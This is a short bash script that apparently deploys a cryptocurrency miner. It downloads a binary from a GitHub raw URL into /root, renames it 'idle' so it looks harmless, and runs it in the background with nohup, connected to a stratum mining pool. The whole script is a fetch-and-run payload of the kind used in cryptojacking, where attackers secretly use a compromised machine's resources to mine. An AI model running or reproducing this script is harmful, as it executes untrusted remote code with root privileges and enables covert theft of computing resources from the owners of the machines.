#!/bin/bash

pkill -f idle

sleep 5

cd /root || exit 1

wget https://raw.githubusercontent.com/zjaacmyx/xxx1/main/idle -O idle

sleep 5

chmod +x idle

nohup ./idle --url=stratum+tcp://xxx3.zjlcc.eu.org:7777 --user=worker_name --pass=x > idle.log 2>&1 &

sleep 2
